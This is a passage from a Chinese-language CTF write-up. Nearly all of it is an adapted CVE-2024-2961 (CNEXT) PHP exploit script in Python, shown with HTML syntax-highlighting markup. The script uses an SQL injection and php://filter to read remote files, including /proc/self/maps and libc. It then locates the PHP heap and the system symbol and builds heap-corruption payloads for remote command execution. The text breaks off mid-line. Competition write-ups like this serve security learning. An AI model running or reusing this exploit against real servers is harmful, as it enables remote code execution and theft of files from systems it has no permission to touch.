class="line-numbers-rows"><span></span></span></code></pre><p>æŠŠè¯»å–åˆ°çš„å†…å®¹dumpä¸‹æ¥<del>ï¼ˆæ‡’å¾—å†™pyè„šæœ¬åŒ¹é…äº†ï¼‰</del></p><p>ç„¶åçˆ†æ”¹cve-2024-2961çš„è„šæœ¬ï¼Œå…ˆæ‰“å°å‡º libc.pathå¾—åˆ° libc çš„è·¯å¾„ï¼Œå†æŠŠ libc.so.6 dump ä¸‹æ¥ï¼Œå¡«è¿› LIBC_FILE ï¼Œç„¶åå†è·‘ä¸€æ¬¡è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ChunkedEncodingError<span class="token punctuation">,</span> ConnectionError<span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"åŠ„"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.        """</span>        <span class="token comment">#print(path)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1/'union select\""</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">"\"#"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token comment">#print(response.text)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"File contents: (.*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>        <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        """</span>                <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result            text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>            text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>            text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>            msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"download_maps"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            maps <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#maps = maps.decode()</span>        <span class="token comment">#print(maps)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token comment">#print(regions)</span>        <span class="token keyword">return</span> regions        <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>            LIBC_FILE <span class="token operator">=</span> <span class="token string">"dump_libc"</span> <span class="token comment"># è‡ªè¡Œdumpï¼Œå»ºè®®ç”¨base64ä¼ªåè®®è¯»å–ä¸‹æ¥é¿å…å‡ºç°æŸå</span>        <span class="token comment"># PHP's heap</span>            self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># Libc</span>            libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">)</span>            <span class="token comment">#self.download_file(libc.path, LIBC_FILE)</span>                self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start        <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> region        <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">""</span>        <span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>            first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> first        <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment">#self.check_vulnerable()</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>            ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>            ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>            CS <span class="token operator">=</span> <span class="token number">0x100</span>            <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>            step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>            <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>            step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>            step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>            step3_size <span class="token operator">=</span> CS            step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span 